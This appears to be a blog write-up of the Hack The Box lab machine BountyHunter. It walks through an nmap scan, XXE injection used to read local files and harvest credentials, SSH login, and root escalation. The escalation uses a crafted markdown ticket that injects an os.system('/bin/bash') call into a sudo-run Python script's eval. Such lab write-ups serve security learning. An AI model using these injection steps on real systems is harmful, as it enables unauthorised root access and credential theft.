---
layout: post
title: Hack The Box BountyHunter - Writeup
---

BountyHunter is an easy difficulty Hack The Box machine, exploited using XXE injection (to LFI), and using a markdown file to get root privileges.

## Nmap Scan

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn <IP> -oG allPorts
```

![](/assets/writeups/htb-bountyhunter/nmap_port_scan.png)

## Enumeration

### Port 80

Let's take a look to the page. We have a form to create a new CVE.
We can intercept the request with burpsuite, and we'll intercept the data parameter in base64. Let's decode it.

![](/assets/writeups/htb-bountyhunter/data_decoded.png)

mmm sounds good! 😎

## XXE to LFI

Using wfuzz we found a php file called `db.php`.
So, let's send this request to the repeater in burpsuite, and using this payload we'll get the content of this file in base64.
Remember to encode the XML to base64.

![](/assets/writeups/htb-bountyhunter/db.php_xxe_lfi.png)

At this point we should get a base64 string, let's decode it.

![](/assets/writeups/htb-bountyhunter/db.php_base64_decode.png)

Cool! :)

We found some credentials. SSH? Yep, but user test won't work.
Taking a look to the `/etc/passwd` using the XXE vulnerability, there is a development user. Let's try this user...

![](/assets/writeups/htb-bountyhunter/ssh_development_user.png)

Amaaaazing...! We found the user flag! 😎

## Privilege escalation - root

First, we check what sudo capabilities our user development got using `sudo -l`.

We find the following.

```bash
(root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

WTF is this? Let's take a look...

`cat /opt/skytrain_inc/ticketValidator.py`

```python
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

The code asks for a file name, then it makes sure that the filename is ended with .md extension.
If true, then the code opens the file and search for the next conditions.

```python
for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1: if line number 1 Exist and not startwith "## Ticket to " , Quit else Continue
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

    if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
```

Okaay! Let's create a `test.md` like this:

```markdown
# Skytrain Inc
## Ticket to
__Ticket Code:__
**102+ 10 == 112 and __import__('os').system('/bin/bash') == False
```

Run it, and you will get the root shell. Cat to the flag, and we are done!

![](/assets/writeups/htb-bountyhunter/pwned.png)
